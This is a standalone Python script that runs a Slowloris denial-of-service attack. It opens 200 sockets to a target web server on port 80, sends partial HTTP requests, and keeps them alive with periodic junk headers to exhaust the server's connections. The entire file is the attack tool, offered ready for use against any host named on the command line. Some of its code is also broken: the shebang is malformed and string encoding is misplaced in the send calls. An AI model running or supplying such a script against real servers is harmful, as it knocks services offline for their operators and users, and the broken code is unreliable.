#!usr/bin/python3

'''
perform a slow loris attack
'''

import sys
import time
import socket
import random

log_level = 2


def log(text, level=1):
    ''' logger '''
    if log_level >= level:
        print(text)

list_of_sockets = []
regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv 36.0) Gecko/20100101 Firefox/62.0",
    "Accept-language: en-US, en, q=0.5"
]

def init_socket(ip):
    ''' init_socket fn '''
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip, 80))

    s.send(f'GET /?{random.randint(0, 2000)} HTTP/1.1\r\n').encode("utf-8")
    for header in regular_headers:
        s.send(f'{header}\r\n').encode("utf-8")
    return s

def main():
    ''' main fn '''
    if len(sys.argv) != 2:
        print(f'Usage: {sys.argv[0]} example.com')
        return
    
    ip = sys.argv[1]
    socket_count = 200
    log(f'Attacking {ip} with {socket_count} sockets...')
    log(f'Creating sockets...')

    for _ in range(socket_count):
        try:
            log(f'Creating socket #{_}...', level = 2)
            s = init_socket(ip)
        except socket.error:
            break
        list_of_sockets.append(s)
    while True:
        log(f'Sending keep-alive headers... Socket count: {len(list_of_sockets)}')
        for s in list(list_of_sockets):
            try:
                s.send(f'X-a: {random.randint(1, 5000)}\r\n')
            except socket.error:
                list_of_sockets.remove(s)
        
        for _ in range(socket_count - len(list_of_sockets)):
            log(f'Recreating socket...')
            try:
                s = init_socket(ip)
                if s:
                    list_of_sockets.append(s)
            except socket.error:
                break
        time.sleep(15)


if __name__ == '__main__':
    main()
